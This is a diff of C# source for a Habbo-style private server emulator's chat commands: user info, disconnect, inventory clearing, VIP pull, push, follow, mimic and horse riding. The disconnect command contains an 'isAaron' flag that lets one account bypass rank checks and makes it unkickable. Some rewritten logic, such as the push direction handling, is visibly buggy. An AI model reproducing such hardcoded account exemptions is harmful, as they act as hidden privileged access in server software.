+                            }
+                            if (TargetHabbo == null)
+                            {
+                                Session.SendNotif("Unable to find user " + Params[1]);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            StringBuilder Builderer = new StringBuilder();
+                            if (TargetHabbo.CurrentRoom != null)
+                            {
+                                Builderer.Append(" - ROOM INFORMATION FOR ROOMID: " + TargetHabbo.CurrentRoom.RoomId + " - \r");
+                                Builderer.Append("Owner: " + TargetHabbo.CurrentRoom.Owner + "\r");
+                                Builderer.Append("Room name: " + TargetHabbo.CurrentRoom.Name + "\r");
+                                Builderer.Append(string.Concat(new object[]
 							{
-								string text = Params[1];
-								room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-								class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-								RoomUser class4 = room.method_57(text);
-								if (class6.class34_1 != null)
-								{
-									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_riding"));
-									return true;
-								}
-								if (!class4.IsBot || class4.PetData.Type != 13u)
-								{
-									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_nothorse"));
-									return true;
-								}
-								bool arg_40EB_0;
-								if ((class6.X + 1 != class4.X || class6.Y != class4.Y) && (class6.X - 1 != class4.X || class6.Y != class4.Y) && (class6.Y + 1 != class4.Y || class6.X != class4.X))
-								{
-									if (class6.Y - 1 == class4.Y)
-									{
-										if (class6.X == class4.X)
-										{
-											goto IL_40C2;
-										}
-									}
-									arg_40EB_0 = (class6.X != class4.X || class6.Y != class4.Y);
-									goto IL_40EB;
-								}
-								IL_40C2:
-								arg_40EB_0 = false;
-								IL_40EB:
-								if (arg_40EB_0)
-								{
-									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_toofar"));
-									return true;
-								}
-								if (class4.BotData.RoomUser_0 == null)
-								{
-									class4.BotData.RoomUser_0 = class6;
-									class6.class34_1 = class4.BotData;
-									class6.X = class4.X;
-									class6.Y = class4.Y;
-									class6.Z = class4.Z + 1.0;
-									class6.RotBody = class4.RotBody;
-									class6.RotHead = class4.RotHead;
-									class6.UpdateNeeded = true;
-									room.UpdateUserStatus(class6, false, false);
-									class6.Target = class4;
-									class6.Statusses.Clear();
-									class4.Statusses.Clear();
-									Session.GetHabbo().GetAvatarEffectsInventoryComponent().ApplyEffect(77, true);
-									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_instr_getoff"));
-									room.GenerateMaps();
-									return true;
-								}
-								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_tooslow"));
-								return true;
-							}
-							default:
-								switch (num)
-								{
-								case 67:
-								{
-									string text7 = "Your Commands:\r\r";
-									if (Session.GetHabbo().HasRole("cmd_update_settings"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_settings_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_update_bans"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_bans_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_update_permissions"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_permissions_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_update_filter"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_filter_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_update_bots"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_bots_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_update_catalogue"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_catalogue_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_update_items"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_items_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_update_navigator"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_navigator_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_update_achievements"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_achievements_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_award"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_award_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_coords"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_coords_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_override"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_override_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_teleport"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_teleport_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_coins"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_coins_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_pixels"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_pixels_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_points"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_points_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_alert"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_alert_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_motd"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_motd_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_roomalert"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_roomalert_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_ha"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_ha_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_hal"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_hal_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_freeze"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_freeze_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_enable"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_enable_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_roommute"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_roommute_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_setspeed"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_setspeed_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_globalcredits"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_globalcredits_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_globalpixels"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_globalpixels_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_globalpoints"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_globalpoints_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_masscredits"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_masscredits_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_masspixels"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_masspixels_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_masspoints"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_masspoints_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_givebadge"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_givebadge_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_removebadge"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_removebadge_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_summon"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_summon_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_roombadge"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_roombadge_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_massbadge"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_massbadge_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_userinfo"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_userinfo_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_shutdown"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_shutdown_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_invisible"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_invisible_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_ban"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_ban_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_superban"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_superban_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_ipban"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_ipban_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_kick"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_kick_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_roomkick"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_roomkick_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_mute"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_mute_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_unmute"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_unmute_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_sa"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_sa_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_spull"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_spull_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_empty"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_empty_desc") + "\r\r";
-									}
-									if (Session.GetHabbo().HasRole("cmd_update_texts"))
-									{
-										text7 = text7 + TextManager.GetText("cmd_update_texts_desc") + "\r\r";
-									}
-                                    if (Session.GetHabbo().HasRole("cmd_dance"))
+								"Users in room: ",
+								TargetHabbo.CurrentRoom.UserCount,
+								"/",
+								TargetHabbo.CurrentRoom.UsersMax
+							}));
+                            }
+                            uint UserRank = TargetHabbo.Rank;
+                            string UserIP = "";
+                            if (Session.GetHabbo().HasRole("cmd_userinfo_viewip"))
+                            {
+                                UserIP = "UserIP: " + TargetHabbo.LastIp + " \r";
+                            }
+                            Session.SendNotif(string.Concat(new object[]
+						{
+							"User information for user: ",
+							Params[1],
+							":\rRank: ",
+							UserRank,
+							" \rUser online: ",
+							flag2.ToString(),
+							" \rUserID: ",
+							TargetHabbo.Id,
+							" \r",
+							UserIP,
+							"Visiting room: ",
+							TargetHabbo.CurrentRoomId,
+							" \rUser motto: ",
+							TargetHabbo.Motto,
+							" \rUser credits: ",
+							TargetHabbo.Credits,
+							" \rUser pixels: ",
+							TargetHabbo.ActivityPoints,
+							" \rUser points: ",
+							TargetHabbo.shells,
+							" \rUser muted: ",
+							TargetHabbo.Muted.ToString(),
+							"\r\r\r",
+							Builderer.ToString()
+						}));
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Disconnect
+                        case 66: //CMD Disconnect
+                            if (!Session.GetHabbo().HasRole("cmd_disconnect"))
+                            {
+                                return false;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("Could not find user: " + Params[1]);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (Session.GetHabbo().Rank <= TargetClient.GetHabbo().Rank && !Session.GetHabbo().isAaron)
+                            {
+                                Session.SendNotif("You are not allowed to kick that user.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (!TargetClient.GetHabbo().isAaron)
+                            {
+                                TargetClient.Disconnect();
+                            }
+                            return true;
+                        #endregion
+                        #region CMD Empty
+                        case 10: //CMD Empty
+                            if (Session.GetHabbo().HasRole("cmd_empty") && Params[1] != null)
+                            {
+                                TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                                if (TargetClient != null && TargetClient.GetHabbo() != null)
+                                {
+                                    TargetClient.GetHabbo().GetInventoryComponent().ClearItems();
+                                    Session.SendNotif("Inventory cleared! (Database and cache)");
+                                }
+                                else
+                                {
+                                    using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
                                     {
-                                        text7 = text7 + TextManager.GetText("cmd_dance_desc") + "\r\r";
+                                        adapter.AddParamWithValue("usrname", Params[1]);
+                                        int userId = int.Parse(adapter.ReadString("SELECT Id FROM users WHERE username = @usrname LIMIT 1;"));
+                                        adapter.ExecuteQuery("DELETE FROM items WHERE user_id = '" + userId + "' AND room_id = 0;");
+                                        Session.SendNotif("Inventory cleared! (Database)");
                                     }
-                                    if (Session.GetHabbo().HasRole("cmd_rave"))
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #endregion
+
+                        #region VIP Commands
+                        #region CMD FlagMe
+                        case 12: //CMD FlagMe
+                            if (!GlobalClass.cmdFlagmeEnabled)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
+                                return true;
+                            }
+                            if (!Session.GetHabbo().Vip)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
+                                return true;
+                            }
+                            ServerMessage message = new ServerMessage(573);
+                            Session.SendMessage(message);
+                            return true;
+                        #endregion
+                        #region CMD Follow
+                        case 13: //CMD Follow
+                            if (!GlobalClass.cmdFollowEnabled)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
+                                return true;
+                            }
+                            if (!Session.GetHabbo().Vip)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
+                                return true;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient != null && TargetClient.GetHabbo().InRoom && Session.GetHabbo().CurrentRoom != TargetClient.GetHabbo().CurrentRoom && !TargetClient.GetHabbo().HideInRom)
+                            {
+                                ServerMessage message2 = new ServerMessage(286);
+                                message2.AppendBoolean(TargetClient.GetHabbo().CurrentRoom.IsPublic);
+                                message2.AppendUInt(TargetClient.GetHabbo().CurrentRoomId);
+                                Session.SendMessage(message2);
+                            }
+                            else
+                            {
+                                Session.GetHabbo().Sendselfwhisper("User: " + Params[1] + " could not be found - Maybe they're not online or not in a room anymore (or maybe they're a ninja)");
+                            }
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Mimic
+                        case 28: //CMD Mimic    
+                            if (!GlobalClass.cmdMimicEnabled)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
+                                return true;
+                            }
+                            if (!Session.GetHabbo().Vip)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
+                                return true;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                Session.GetHabbo().Sendselfwhisper("Could not find user: " + Params[1]);
+                                return true;
+                            }
+                            Session.GetHabbo().Look = TargetClient.GetHabbo().Look;
+                            Session.GetHabbo().method_26(false, Session); //method_26? What is it? I don't know.
+                            return true;
+                        #endregion
+                        #region CMD Moonwalk
+                        case 29: //CMD Moonwalk
+                            if (!GlobalClass.cmdMoonwalkEnabled)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
+                                return true;
+                            }
+                            if (!Session.GetHabbo().Vip)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
+                                return true;
+                            }
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            if (TargetRoom == null)
+                            {
+                                return false;
+                            }
+                            TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                            if (TargetRoomUser == null)
+                            {
+                                return false;
+                            }
+                            if (TargetRoomUser.WalkBackwards)
+                            {
+                                TargetRoomUser.WalkBackwards = false;
+                                Session.GetHabbo().Sendselfwhisper("Your moonwalk has been disabled.");
+                                return true;
+                            }
+                            TargetRoomUser.WalkBackwards = true;
+                            Session.GetHabbo().Sendselfwhisper("Your moonwalk has been enabled.");
+                            return true;
+                        #endregion
+                        #region CMD Pull
+                        case 36: //CMD Pull
+                            try
+                            {
+                                if (!GlobalClass.cmdPullEnabled)
+                                {
+                                    Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
+                                    return true;
+                                }
+                                if (!Session.GetHabbo().Vip)
+                                {
+                                    Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
+                                    return true;
+                                }
+                                string a = "down";
+                                TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                                TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                                if (Session == null || TargetClient == null)
+                                {
+                                    return false;
+                                }
+                                TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                                RoomUser TargetRoomUser2 = TargetRoom.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
+                                if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
+                                {
+                                    Session.GetHabbo().Sendselfwhisper("You cannot pull yourself");
+                                    return true;
+                                }
+                                if (TargetClient.GetHabbo().CurrentRoomId == Session.GetHabbo().CurrentRoomId && Math.Abs(TargetRoomUser.X - TargetRoomUser2.X) < 3 && Math.Abs(TargetRoomUser.Y - TargetRoomUser2.Y) < 3)
+                                {
+                                    TargetRoomUser.Chat(Session, "*pulls " + TargetClient.GetHabbo().Username + " to them*", false);
+                                    if (TargetRoomUser.RotBody == 0)
                                     {
-                                        text7 = text7 + TextManager.GetText("cmd_rave_desc") + "\r\r";
+                                        a = "up";
                                     }
-                                    if (Session.GetHabbo().HasRole("cmd_roll"))
+                                    if (TargetRoomUser.RotBody == 2)
                                     {
-                                        text7 = text7 + TextManager.GetText("cmd_roll_desc") + "\r\r";
+                                        a = "right";
                                     }
-                                    if (Session.GetHabbo().HasRole("cmd_control"))
+                                    if (TargetRoomUser.RotBody == 4)
                                     {
-                                        text7 = text7 + TextManager.GetText("cmd_control_desc") + "\r\r";
+                                        a = "down";
                                     }
-                                    if (Session.GetHabbo().HasRole("cmd_makesay"))
+                                    if (TargetRoomUser.RotBody == 6)
                                     {
-                                        text7 = text7 + TextManager.GetText("cmd_makesay_desc") + "\r\r";
+                                        a = "left";
                                     }
-                                    if (Session.GetHabbo().HasRole("cmd_sitdown"))
+                                    if (a == "up")
                                     {
-                                        text7 = text7 + TextManager.GetText("cmd_sitdown_desc") + "\r\r";
+                                        TargetRoomUser2.MoveTo(TargetRoomUser.X, TargetRoomUser.Y - 1);
                                     }
-									if (Session.GetHabbo().Vip)
+                                    if (a == "right")
+                                    {
+                                        TargetRoomUser2.MoveTo(TargetRoomUser.X + 1, TargetRoomUser.Y);
+                                    }
+                                    if (a == "down")
+                                    {
+                                        TargetRoomUser2.MoveTo(TargetRoomUser.X, TargetRoomUser.Y + 1);
+                                    }
+                                    if (a == "left")
+                                    {
+                                        TargetRoomUser2.MoveTo(TargetRoomUser.X - 1, TargetRoomUser.Y);
+                                    }
+                                    return true;
+                                }
+                                Session.GetHabbo().Sendselfwhisper("That user is not close enough to you to be pulled, try getting closer");
+                                return true;
+                            }
+                            catch
+                            {
+                                return false;
+                            }
+                        #endregion
+                        #region CMD Push
+                        case 37: //CMD Push
+                            try
+                            {
+                                if (!GlobalClass.cmdPushEnabled)
+                                {
+                                    Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
+                                    return true;
+                                }
+                                if (!Session.GetHabbo().Vip)
+                                {
+                                    Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
+                                    return true;
+                                }
+                                string a = "down";
+                                TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                                TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                                if (Session == null || TargetClient == null)
+                                {
+                                    return false;
+                                }
+                                TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                                RoomUser TargetRoomUser2 = TargetRoom.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
+                                if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
+                                {
+                                    Session.GetHabbo().Sendselfwhisper("It can't be that bad mate, no need to push yourself!");
+                                    return true;
+                                }
+                                bool arg_3DD2_0; //What is it? I don't know!
+                                if (TargetClient.GetHabbo().CurrentRoomId == Session.GetHabbo().CurrentRoomId)
+                                {
+                                    if ((TargetRoomUser.X + 1 != TargetRoomUser2.X || TargetRoomUser.Y != TargetRoomUser2.Y) && (TargetRoomUser.X - 1 != TargetRoomUser2.X || TargetRoomUser.Y != TargetRoomUser2.Y) && (TargetRoomUser.Y + 1 != TargetRoomUser2.Y || TargetRoomUser.X != TargetRoomUser2.X))
+                                    {
+                                        if (TargetRoomUser.Y - 1 == TargetRoomUser2.Y)
+                                        {
+                                            if (TargetRoomUser.X == TargetRoomUser2.X)
+                                            {
+                                                arg_3DD2_0 = false;
+                                            }
+                                            else
+                                            {
+                                                arg_3DD2_0 = true;
+                                            }
+                                        }
+                                        arg_3DD2_0 = (TargetRoomUser.X != TargetRoomUser2.X || TargetRoomUser.Y != TargetRoomUser2.Y);
+                                        if (!arg_3DD2_0)
+                                        {
+                                            TargetRoomUser.Chat(Session, "*pushes " + TargetClient.GetHabbo().Username + "*", false);
+                                            if (TargetRoomUser.RotBody == 0)
+                                            {
+                                                a = "up";
+                                                a = "right";
+                                            }
+                                            if (TargetRoomUser.RotBody == 4)
+                                            {
+                                                a = "down";
+                                            }
+                                            if (TargetRoomUser.RotBody == 6)
+                                            {
+                                                a = "left";
+                                            }
+                                            if (TargetRoomUser.RotBody == 2)
+                                            {
+                                            }
+                                            if (a == "up")
+                                            {
+                                                TargetRoomUser2.MoveTo(TargetRoomUser2.X, TargetRoomUser2.Y - 1);
+                                            }
+                                            if (a == "right")
+                                            {
+                                                TargetRoomUser2.MoveTo(TargetRoomUser2.X + 1, TargetRoomUser2.Y);
+                                            }
+                                            if (a == "down")
+                                            {
+                                                TargetRoomUser2.MoveTo(TargetRoomUser2.X, TargetRoomUser2.Y + 1);
+                                            }
+                                            if (a == "left")
+                                            {
+                                                TargetRoomUser2.MoveTo(TargetRoomUser2.X - 1, TargetRoomUser2.Y);
+                                            }
+                                        }
+                                        return true;
+                                    }
+                                }
+                                return false;
+                            }
+                            catch
+                            {
+                                return false;
+                            }
+                        #endregion
+                        #endregion
+
+                        #region Normal Commands
+                        #region CMD Buy
+                        case 5: //CMD Buy
+                            int amountToBuy = Convert.ToInt16(Params[1]);
+                            if (amountToBuy > 0 && amountToBuy < 101)
+                            {
+                                Session.GetHabbo().BuyCount = (int)Convert.ToInt16(Params[1]);
+                            }
+                            else
+                            {
+                                Session.GetHabbo().Sendselfwhisper("Please choose a value between 1 - 100");
+                            }
+                            return true;
+                        #endregion
+                        #region CMD Ride
+                        case 40: //CMD Ride
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                            RoomUser TargetRoomUser3 = TargetRoom.method_57(Params[1]);
+                            if (TargetRoomUser.class34_1 != null)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_riding"));
+                                return true;
+                            }
+                            if (!TargetRoomUser3.IsBot || TargetRoomUser3.PetData.Type != 13)
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_nothorse"));
+                                return true;
+                            }
+                            bool arg_40EB_0; //What is it? I don't know!
+                            if ((TargetRoomUser.X + 1 != TargetRoomUser3.X || TargetRoomUser.Y != TargetRoomUser3.Y) && (TargetRoomUser.X - 1 != TargetRoomUser3.X || TargetRoomUser.Y != TargetRoomUser3.Y) && (TargetRoomUser.Y + 1 != TargetRoomUser3.Y || TargetRoomUser.X != TargetRoomUser3.X))
+                            {
+                                if (TargetRoomUser.Y - 1 == TargetRoomUser3.Y)
+                                {
+                                    if (TargetRoomUser.X == TargetRoomUser3.X)
+                                    {
+                                        arg_40EB_0 = false;
+                                    }
+                                }
+                                arg_40EB_0 = (TargetRoomUser.X != TargetRoomUser3.X || TargetRoomUser.Y != TargetRoomUser3.Y);
+                                if (arg_40EB_0)
+                                {
+                                    Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_toofar"));
+                                    return true;
+                                }
+                            }
+                            if (TargetRoomUser3.BotData.RoomUser_0 == null)
+                            {
+                                TargetRoomUser3.BotData.RoomUser_0 = TargetRoomUser;
+                                TargetRoomUser.class34_1 = TargetRoomUser3.BotData;
+                                TargetRoomUser.X = TargetRoomUser3.X;
+                                TargetRoomUser.Y = TargetRoomUser3.Y;
+                                TargetRoomUser.Z = TargetRoomUser3.Z + 1.0;
+                                TargetRoomUser.RotBody = TargetRoomUser3.RotBody;
+                                TargetRoomUser.RotHead = TargetRoomUser3.RotHead;
+                                TargetRoomUser.UpdateNeeded = true;
+                                TargetRoom.UpdateUserStatus(TargetRoomUser, false, false);
+                                TargetRoomUser.Target = TargetRoomUser3;
+                                TargetRoomUser.Statusses.Clear();
+                                TargetRoomUser3.Statusses.Clear();
+                                Session.GetHabbo().GetAvatarEffectsInventoryComponent().ApplyEffect(77, true);
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_instr_getoff"));
+                                TargetRoom.GenerateMaps();
+                                return true;
+                            }
+                            Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_tooslow"));
+                            return true;
+                        #endregion
+                        #region CMD Dismount
+                        case 80: //CMD Dismount
+                        case 81:
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                            if (TargetRoomUser.class34_1 != null)
+                            {
+                                Session.GetHabbo().GetAvatarEffectsInventoryComponent().ApplyEffect(-1, true);
+                                TargetRoomUser.class34_1.RoomUser_0 = null;
+                                TargetRoomUser.class34_1 = null;
+                                TargetRoomUser.Z -= 1.0;
+                                TargetRoomUser.Statusses.Clear();
+                                TargetRoomUser.UpdateNeeded = true;
+                                int int_3 = PhoenixEnvironment.GetRandomNumber(0, TargetRoom.Model.MapSizeX);
+                                int int_4 = PhoenixEnvironment.GetRandomNumber(0, TargetRoom.Model.MapSizeY);
+                                TargetRoomUser.Target.MoveTo(int_3, int_4);
+                                TargetRoomUser.Target = null;
+                                TargetRoom.UpdateUserStatus(TargetRoomUser, false, false);
+                            }
+                            return true;
+                        #endregion
+                        #region CMD DisableDiagonal
+                        case 8: //CMD DisableDiagonal
+                            Session.SendNotif("Command disabled");
+                            return true;
+                        #endregion
+                        #region CMD EmptyItems
+                        case 9: //CMD EmptyItems
+                            Session.GetHabbo().GetInventoryComponent().ClearItems();
+                            Session.SendNotif(TextManager.GetText("cmd_emptyitems_success"));
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD EmptyPets
+                        case 82: //CMD EmptyPets
+                            Session.GetHabbo().GetInventoryComponent().ClearPets();
+                            Session.SendNotif(TextManager.GetText("cmd_emptypets_success"));
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD RedeemCreds
+                        case 38: //CMD RedeemCreds
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                            if (TargetRoomUser.IsTrading)
+                            {
+                                Session.GetHabbo().Sendselfwhisper("Command unavailable while trading");
+                                return true;
+                            }
+                            if (GlobalClass.cmdRedeemCredits)
+                            {
+                                Session.GetHabbo().GetInventoryComponent().RedeemCredits(Session);
+                            }
+                            else
+                            {
+                                Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
+                            }
+                            return true;
+                        #endregion
+                        #region CMD Commands
+                        case 67: //CMD Commands
+                            string Command = "Your Commands:\r\r";
+                            if (Session.GetHabbo().HasRole("cmd_update_settings"))
+                            {
